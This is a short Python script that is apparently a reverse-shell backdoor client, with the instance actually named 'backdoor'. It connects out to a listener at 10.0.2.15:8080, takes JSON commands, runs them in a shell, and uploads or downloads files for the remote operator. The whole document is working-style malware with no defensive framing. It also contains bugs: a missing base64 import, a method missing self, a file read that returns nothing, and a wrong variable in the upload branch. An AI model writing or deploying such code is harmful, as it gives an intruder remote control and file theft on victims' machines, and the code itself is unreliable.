import socket
import subprocess
import json
import os

class Socket:
    def __init__(self,ip,port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def command_execution(command):
        return subprocess.check_output(command, shell=True)

    def json_send(self,data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self,directory):
        os.chdir(directory)

    def get_file_contents(self,path):
        with open(path,"rb") as my_file:
            base64.b64encode(my_file.read())

    def save_file(self,path,contents):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(contents))

    def start_socket(self):
        while True:
            try:
                command = self.json_receive()
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd":
                    command_output = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command_output[1],command_output[2])
                else:
                    command_output = self.command_execution(command)

            except Exception:
                command_output = "Error!"
            self.json_send(command_output)

        self.my_connection.close()

backdoor = Socket("10.0.2.15",8080)
backdoor.start_socket()